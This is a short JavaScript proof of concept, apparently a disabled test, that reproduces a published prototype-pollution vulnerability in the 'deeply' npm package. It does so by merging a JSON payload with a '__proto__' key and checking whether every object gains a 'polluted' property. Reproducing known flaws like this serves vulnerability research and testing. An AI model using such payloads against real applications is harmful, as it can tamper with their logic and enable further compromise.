// //https://snyk.io/vuln/SNYK-JS-DEEPLY-451026
// test("prototype pollution in deeply ", () => {
  const mergeFn = require("deeply");
  const payload = '{"__proto__": {"polluted": "yes"}}';
  var obj = {};

console.log({}.polluted);

  mergeFn({}, JSON.parse(payload));
console.log({}.polluted);
// });
